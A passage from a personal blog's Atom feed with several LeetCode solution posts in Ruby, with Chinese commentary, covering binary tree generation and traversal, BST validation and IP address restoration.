class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; n</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;TreeNode[]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_trees</span><span class="params">(n)</span></span></span><br><span class="line">  <span class="keyword">return</span> [] <span class="keyword">if</span> n == <span class="number">0</span></span><br><span class="line">  _generate_trees(<span class="number">1</span>, n)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> _generate_trees<span class="params">(left, right)</span></span></span><br><span class="line">  result = []</span><br><span class="line">  <span class="keyword">if</span> left &gt; right</span><br><span class="line">    result &lt;&lt; <span class="literal">nil</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    (left..right).each <span class="keyword">do</span> <span class="params">|i|</span></span><br><span class="line">      lefts = _generate_trees(left, i - <span class="number">1</span>)</span><br><span class="line">      rights = _generate_trees(i + <span class="number">1</span>, right)</span><br><span class="line">      lefts.length.times.each <span class="keyword">do</span> <span class="params">|j|</span></span><br><span class="line">        rights.length.times.each <span class="keyword">do</span> <span class="params">|k|</span></span><br><span class="line">          root = TreeNode.new(i)</span><br><span class="line">          root.left = lefts[j]</span><br><span class="line">          root.right = rights[k]</span><br><span class="line">          result &lt;&lt; root</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度-1"><a href="#复杂度-1" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n!)</code></li><li>空间复杂度：<code>O(n!)</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Unique-Binary-Search-Trees&quot;&gt;&lt;a href=&quot;#Unique-Binary-Search-Trees&quot; class=&quot;headerlink&quot; title=&quot;Unique Binary Search Trees&quot;&gt;&lt;/a&gt;Unique B
      
    
    </summary>
    
      <category term="LeetCode" scheme="http://jack0pan.github.io/categories/LeetCode/"/>
    
    
      <category term="LeetCode" scheme="http://jack0pan.github.io/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>Binary Tree Deep Traversal</title>
    <link href="http://jack0pan.github.io/2018/04/28/Binary-Tree-Deep-Traversal/"/>
    <id>http://jack0pan.github.io/2018/04/28/Binary-Tree-Deep-Traversal/</id>
    <published>2018-04-28T15:06:25.000Z</published>
    <updated>2018-05-05T02:38:49.333Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Binary-Tree-Deep-Traversal"><a href="#Binary-Tree-Deep-Traversal" class="headerlink" title="Binary Tree Deep Traversal"></a>Binary Tree Deep Traversal</h1><h2 id="94-Binary-Tree-Inorder-Traversal"><a href="#94-Binary-Tree-Inorder-Traversal" class="headerlink" title="94. Binary Tree Inorder Traversal"></a>94. Binary Tree Inorder Traversal</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Given a binary tree, return the inorder traversal of its nodes’ values.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,null,2,3]</span><br><span class="line">   1</span><br><span class="line">    \</span><br><span class="line">     2</span><br><span class="line">    /</span><br><span class="line">   3</span><br><span class="line"></span><br><span class="line">Output: [1,3,2]</span><br></pre></td></tr></table></figure></p><p>Follow up: Recursive solution is trivial, could you do it iteratively?</p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>二叉树中序遍历，题目要求迭代方式实现。</p><p>先来看递归方式：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inorder_traversal</span><span class="params">(root)</span></span></span><br><span class="line">  path = []</span><br><span class="line">  traverse = lambda &#123; <span class="params">|node|</span></span><br><span class="line">    <span class="keyword">if</span> node</span><br><span class="line">      traverse.call(node.left)</span><br><span class="line">      path &lt;&lt; node.val</span><br><span class="line">      traverse.call(node.right)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  &#125;</span><br><span class="line">  traverse.call(root)</span><br><span class="line">  <span class="keyword">return</span> path</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>再看迭代方式：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inorder_traversal</span><span class="params">(root)</span></span></span><br><span class="line">  <span class="keyword">return</span> [] <span class="keyword">if</span> root.<span class="literal">nil</span>?</span><br><span class="line">  node, stack, path = root, [], []</span><br><span class="line">  <span class="keyword">while</span> node <span class="keyword">or</span> <span class="keyword">not</span> stack.empty?</span><br><span class="line">    <span class="keyword">while</span> node</span><br><span class="line">      stack.push node</span><br><span class="line">      node = node.left</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    node = stack.pop</span><br><span class="line">    path &lt;&lt; node.val</span><br><span class="line">    node = node.right</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  path</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h2 id="144-Binary-Tree-Preorder-Traversal"><a href="#144-Binary-Tree-Preorder-Traversal" class="headerlink" title="144. Binary Tree Preorder Traversal"></a>144. Binary Tree Preorder Traversal</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>Given a binary tree, return the preorder traversal of its nodes’ values.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,null,2,3]</span><br><span class="line">   1</span><br><span class="line">    \</span><br><span class="line">     2</span><br><span class="line">    /</span><br><span class="line">   3</span><br><span class="line"></span><br><span class="line">Output: [1,2,3]</span><br></pre></td></tr></table></figure></p><p>Follow up: Recursive solution is trivial, could you do it iteratively?</p><h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>二叉树前序遍历</p><p>递归方式：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preorder_traversal</span><span class="params">(root)</span></span></span><br><span class="line">  path = []</span><br><span class="line">  traverse = lambda &#123; <span class="params">|node|</span></span><br><span class="line">    <span class="keyword">if</span> node</span><br><span class="line">      path &lt;&lt; node.val</span><br><span class="line">      traverse.call(node.left)</span><br><span class="line">      traverse.call(node.right)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  &#125;</span><br><span class="line">  traverse.call(root)</span><br><span class="line">  <span class="keyword">return</span> path</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>迭代方式：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preorder_traversal</span><span class="params">(root)</span></span></span><br><span class="line">  <span class="keyword">return</span> [] <span class="keyword">if</span> root.<span class="literal">nil</span>?</span><br><span class="line">  node, stack, path = root, [], []</span><br><span class="line">  <span class="keyword">while</span> node <span class="keyword">or</span> <span class="keyword">not</span> stack.empty?</span><br><span class="line">    <span class="keyword">while</span> node</span><br><span class="line">      path &lt;&lt; node.val</span><br><span class="line">      stack.push node</span><br><span class="line">      node = node.left</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    node = stack.pop</span><br><span class="line">    node = node.right</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  path</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h2 id="145-Binary-Tree-Postorder-Traversal"><a href="#145-Binary-Tree-Postorder-Traversal" class="headerlink" title="145. Binary Tree Postorder Traversal"></a>145. Binary Tree Postorder Traversal</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>Given a binary tree, return the postorder traversal of its nodes’ values.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,null,2,3]</span><br><span class="line">   1</span><br><span class="line">    \</span><br><span class="line">     2</span><br><span class="line">    /</span><br><span class="line">   3</span><br><span class="line"></span><br><span class="line">Output: [3,2,1]</span><br></pre></td></tr></table></figure></p><p>Follow up: Recursive solution is trivial, could you do it iteratively?</p><h3 id="算法-2"><a href="#算法-2" class="headerlink" title="算法"></a>算法</h3><p>二叉树后序遍历</p><p>递归方式：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">postorder_traversal</span><span class="params">(root)</span></span></span><br><span class="line">  path = []</span><br><span class="line">  traverse = lambda &#123; <span class="params">|node|</span></span><br><span class="line">    <span class="keyword">if</span> node</span><br><span class="line">      traverse.call(node.left)</span><br><span class="line">      traverse.call(node.right)</span><br><span class="line">      path &lt;&lt; node.val</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  &#125;</span><br><span class="line">  traverse.call(root)</span><br><span class="line">  <span class="keyword">return</span> path</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>迭代方式：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">postorder_traversal</span><span class="params">(root)</span></span></span><br><span class="line">  <span class="keyword">return</span> [] <span class="keyword">if</span> root.<span class="literal">nil</span>?</span><br><span class="line">  node, stack, path = root, [], []</span><br><span class="line">  <span class="keyword">while</span> <span class="keyword">not</span> stack.empty? <span class="keyword">or</span> path.empty?</span><br><span class="line">    <span class="keyword">if</span> node</span><br><span class="line">      stack.push node</span><br><span class="line">      node = node.left ? node.left : node.right</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      next_node = stack.pop </span><br><span class="line">      node = stack.last </span><br><span class="line">      <span class="keyword">while</span> node &amp;&amp; node.right == next_node</span><br><span class="line">        path &lt;&lt; next_node.val </span><br><span class="line">        next_node = stack.pop </span><br><span class="line">        node = stack.last </span><br><span class="line">      <span class="keyword">end</span> </span><br><span class="line">      node = node ? node.right : <span class="literal">nil</span></span><br><span class="line">      path &lt;&lt; next_node.val</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  path</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Binary-Tree-Deep-Traversal&quot;&gt;&lt;a href=&quot;#Binary-Tree-Deep-Traversal&quot; class=&quot;headerlink&quot; title=&quot;Binary Tree Deep Traversal&quot;&gt;&lt;/a&gt;Binary T
      
    
    </summary>
    
      <category term="LeetCode" scheme="http://jack0pan.github.io/categories/LeetCode/"/>
    
    
      <category term="LeetCode" scheme="http://jack0pan.github.io/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>Validate Binary Search Tree</title>
    <link href="http://jack0pan.github.io/2018/04/28/Validate-Binary-Search-Tree/"/>
    <id>http://jack0pan.github.io/2018/04/28/Validate-Binary-Search-Tree/</id>
    <published>2018-04-28T13:47:19.000Z</published>
    <updated>2018-05-05T02:47:39.475Z</updated>
    
    <content type="html"><![CDATA[<h1 id="98-Validate-Binary-Search-Tree"><a href="#98-Validate-Binary-Search-Tree" class="headerlink" title="98. Validate Binary Search Tree"></a>98. Validate Binary Search Tree</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a binary tree, determine if it is a valid binary search tree (BST).</p><p>Assume a BST is defined as follows:</p><p>The left subtree of a node contains only nodes with keys less than the node’s key.<br>The right subtree of a node contains only nodes with keys greater than the node’s key.<br>Both the left and right subtrees must also be binary search trees.<br>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">    2</span><br><span class="line">   / \</span><br><span class="line">  1   3</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    5</span><br><span class="line">   / \</span><br><span class="line">  1   4</span><br><span class="line">     / \</span><br><span class="line">    3   6</span><br><span class="line">Output: false</span><br><span class="line">Explanation: The input is: [5,1,4,null,null,3,6]. The root node&apos;s value</span><br><span class="line">             is 5 but its right child&apos;s value is 4.</span><br></pre></td></tr></table></figure></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>验证一棵二叉树是否为二叉搜索树。</p><p>思路就是递归验证左子树和右子树是否都满足条件。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Boolean&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_valid_bst</span><span class="params">(root, l = <span class="literal">nil</span>, r = <span class="literal">nil</span>)</span></span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span> <span class="keyword">if</span> root.<span class="literal">nil</span>?</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span> <span class="keyword">if</span> l &amp;&amp; l &gt; root.val</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span> <span class="keyword">if</span> r &amp;&amp; r &lt; root.val</span><br><span class="line"></span><br><span class="line">  is_valid_bst(root.left, l, root.val - <span class="number">1</span>) &amp;&amp; is_valid_bst(root.right, root.val + <span class="number">1</span>, r)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(logn)</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;98-Validate-Binary-Search-Tree&quot;&gt;&lt;a href=&quot;#98-Validate-Binary-Search-Tree&quot; class=&quot;headerlink&quot; title=&quot;98. Validate Binary Search Tree&quot;
      
    
    </summary>
    
      <category term="LeetCode" scheme="http://jack0pan.github.io/categories/LeetCode/"/>
    
    
      <category term="LeetCode" scheme="http://jack0pan.github.io/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>Restore IP Addresses</title>
    <link href="http://jack0pan.github.io/2018/04/27/Restore-IP-Addresses/"/>
    <id>http://jack0pan.github.io/2018/04/27/Restore-IP-Addresses/</id>
    <published>2018-04-27T14:01:17.000Z</published>
    <updated>2018-05-05T02:31:44.290Z</updated>
    
    <content type="html"><![CDATA[<h1 id="93-Restore-IP-Addresses"><a href="#93-Restore-IP-Addresses" class="headerlink" title="93. Restore IP Addresses"></a>93. Restore IP Addresses</h1><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>这题思路主要是用动态规划，没什么好说的。主要在于对IP的每一项的判断要筛掉以下情况：</p><ul><li>每一项的值不能大于255</li><li>不能以“0”开头（比如：01，00），这种可以通过先转成整数，再转成字符串，和原来比较是否相同。</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;String&#125; s</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;String[]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restore_ip_addresses</span><span class="params">(s)</span></span></span><br><span class="line">  ips = []</span><br><span class="line">  ip = []</span><br><span class="line">  _restore(ips, ip, s, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">return</span> ips</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> _restore<span class="params">(ips, ip, s, level)</span></span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">if</span> s.<span class="literal">nil</span>? <span class="keyword">or</span> s.empty?</span><br><span class="line">  <span class="keyword">if</span> level == <span class="number">4</span></span><br><span class="line">    p = s.to_i</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">if</span> p &gt; <span class="number">255</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">if</span> p.to_s != s</span><br><span class="line">    ip.push(s)</span><br><span class="line">    ips.push(ip.join(<span class="string">'.'</span>))</span><br><span class="line">    ip.pop</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="number">3</span>.times.each <span class="keyword">do</span> <span class="params">|i|</span></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">if</span> s.length &lt; (i + <span class="number">1</span>)</span><br><span class="line">      p = s[<span class="number">0</span>..i].to_i</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">if</span> p &gt; <span class="number">255</span></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">if</span> p.to_s != s[<span class="number">0</span>..i]</span><br><span class="line">      ip.push(s[<span class="number">0</span>..i])</span><br><span class="line">      _restore(ips, ip, s[(i+<span class="number">1</span>)..-<span class="number">1</span>], level + <span class="number">1</span>)</span><br><span class="line">      ip.pop</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><p>这题的时间和空间复杂度是固定的，都是<code>O(3^4)</code>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;93-Restore-IP-Addresses&quot;&gt;&lt;a href=&quot;#93-Restore-IP-Addresses&quot; class=&quot;headerlink&quot; title=&quot;93. Restore IP Addresses&quot;&gt;&lt;/a&gt;93. Restore IP A
      
    
    </summary>
    
      <category term="LeetCode" scheme="http://jack0pan.github.io/categories/LeetCode/"/>
    
    
      <category term="LeetCode" scheme="http://jack0pan.github.io/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>Reverse Linked List</title>
    <link href="http://jack0pan.github.io/2018/04/26/Reverse-Linked-List/"/>
    <id>http://jack0pan.github.io/2018/04/26/Reverse-Linked-List/</id>
    <published>2018-04-26T13:44:32.000Z</published>
    <updated>2018-05-05T03:29:43.017Z</updated>
    
